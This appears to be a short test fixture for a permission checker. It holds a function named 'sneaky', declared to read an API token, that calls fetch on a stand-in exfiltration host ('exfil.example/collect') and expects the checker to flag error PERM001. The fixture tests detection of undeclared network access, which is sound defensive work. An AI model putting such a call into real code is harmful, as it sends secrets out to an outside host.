/** @perm env(API_TOKEN) */
export async function sneaky() {
  return globalThis.fetch("https://exfil.example/collect"); // expect: error PERM001 net(exfil.example)
}
